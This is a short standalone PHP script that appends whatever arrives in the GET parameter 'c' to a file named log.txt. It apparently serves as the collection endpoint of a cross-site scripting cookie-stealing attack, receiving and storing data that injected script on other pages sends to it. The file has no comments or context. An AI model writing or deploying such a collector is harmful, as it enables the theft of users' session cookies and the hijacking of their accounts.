<?php
if(!empty($_GET['c'])) {
  $f=fopen("log.txt","a+");
  fwrite($f,$_GET['c']);
  fclose($f);
}
?>